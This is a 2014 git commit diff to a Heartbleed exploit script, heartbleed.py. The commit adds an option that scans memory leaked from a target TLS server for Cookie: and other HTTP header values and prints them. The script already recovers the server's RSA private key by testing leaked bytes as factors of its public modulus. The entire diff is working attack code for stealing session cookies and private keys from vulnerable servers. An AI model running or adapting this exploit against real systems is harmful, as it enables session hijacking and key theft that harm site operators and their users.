d794bef5f5a2b826aeff7a705d2fff36845148fb
mothran <w.parker.thompson@gmail.com>
2014-04-09 11:52:03 -0700

    added searching for cookies and other HTTP headers

--- scripts/heartbleed.py
+++ scripts/heartbleed.py
@@ -2,6 +2,7 @@ import socket
 import sys
 import getopt
 import time
+import re
 
 from tlslite.api import *
 from tlslite.messages import *
@@ -13,9 +14,10 @@ def usage():
     print "      -d  --  Set the destiation host and port:  HOST:PORT"
     print "      -n  --  Set the number of requests to make, more will grab more memory"
     print "      -p  --  Attempt to obtain the server's SSL private key"
+    print "      -c  --  Attempt to find any cookie values in mem, paramter should be HTTP header ex: -c 'Cookie:'"
 
 try:
-    opts, args = getopt.getopt(sys.argv[1:], "hd:n:p")
+    opts, args = getopt.getopt(sys.argv[1:], "hd:n:c:p")
 except getopt.GetoptError as err:
     print str(err)
     usage()
@@ -24,6 +26,8 @@ except getopt.GetoptError as err:
 numb = 1
 address = "127.0.0.1:443"
 find_priv_key = False
+cookie_val = "Cookie:"
+find_cookie = False
 
 for o, a in opts:
     if o == "-d":
@@ -38,6 +42,9 @@ for o, a in opts:
         sys.exit()
     elif o == "-p":
         find_priv_key = True
+    elif o == "-c":
+        find_cookie = True
+        cookie_val = a
     else:
         assert False, "unhandled option"
 
@@ -78,17 +85,17 @@ except TLSRemoteAlert as a:
         raise
     sys.exit(-1)
 
-if connection.session.serverCertChain:
-    pubkey = connection.session.serverCertChain.x509List[0].publicKey
-    print("n = %s, e = %s" % (pubkey.n, pubkey.e))
-    num_pubkey_bits = numBits(pubkey.n)
-    print("pubkey_bits = %i" % num_pubkey_bits)
-    prime_len_bytes = (num_pubkey_bits + 15) // 16
-else:
-    if find_priv_key:
+if find_priv_key:
+    if connection.session.serverCertChain:
+        pubkey = connection.session.serverCertChain.x509List[0].publicKey
+        print("n = %s, e = %s" % (pubkey.n, pubkey.e))
+        num_pubkey_bits = numBits(pubkey.n)
+        print("pubkey_bits = %i" % num_pubkey_bits)
+        prime_len_bytes = (num_pubkey_bits + 15) // 16
+
+    else:
         print("We don't have a public key to factor, bailing.")
         sys.exit(-1)
-    pubkey = None
 
 
 # printGoodConnection(connection, stop-start)
@@ -109,9 +116,8 @@ for x in range(0, numb):
 
     resp = resp + connection.readPOC(0xffff)
 
-resp = bytearray(resp)
-
 if find_priv_key:
+    resp = bytearray(resp)
     for i in range(0, len(resp)-prime_len_bytes):
         # reverse the bytes, only works for little-endian
         # targets (FIXME? Probably not worth it, would have
@@ -122,6 +128,13 @@ if find_priv_key:
         if data > 1 and pubkey != None and (pubkey.n % data) == 0:
             print("Success! p = %i, q = %i" % (data, pubkey.n//data))
             sys.exit(0)
+elif find_cookie:
+    # This is dirt and needs to be cleaned up.
+    cookies = [m.start() for m in re.finditer(cookie_val, resp)]
+
+    for start in cookies:
+        stop = resp[start:].find("\n")
+        print resp[start: stop]
 else:
     print resp
 
